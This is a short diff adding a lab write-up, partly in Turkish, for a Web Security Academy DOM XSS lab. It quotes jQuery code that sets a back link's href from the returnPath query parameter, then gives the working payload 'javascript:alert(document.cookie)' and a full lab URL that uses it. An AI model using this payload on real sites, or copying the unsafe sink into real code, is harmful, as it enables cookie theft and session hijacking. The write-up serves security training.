@@ -1,0 +1,10 @@
+LAB: DOM XSS in jQuery anchor href attribute sink using location.search source
+
+1 - Submit Feedback sayfasına gidin.
+
+$(function() {
+     $('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+});
+
+2 - returnPath=javascript:alert(document.cookie)
+https://<YOUR-LAB-ID>.web-security-academy.net/feedback?returnPath=javascript:alert(document.cookie)
